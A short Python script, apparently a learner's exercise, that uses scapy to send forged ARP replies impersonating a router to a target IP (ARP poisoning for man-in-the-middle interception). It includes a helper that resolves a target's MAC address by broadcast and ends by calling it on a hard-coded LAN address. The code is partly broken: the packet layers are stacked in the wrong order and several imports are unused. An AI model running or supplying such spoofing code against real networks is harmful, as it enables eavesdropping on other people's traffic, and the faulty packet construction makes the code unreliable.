from async_timeout import timeout
import scapy.all as scapy
import optparse as parse


def arp_poisoning(target_ip,router_id):
    mac_address = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=mac_address,psrc=router_id) # op: arp response 2; arp request 1
    scapy.send(arp_response)
    #scapy.ls(arp_response)
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    brodcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combined = arp_request/brodcast_packet
    answer_list = scapy.srp(combined,timeout=1)[0]
    return answer_list[0][1].hwsrc
get_mac_address('192.168.8.104')
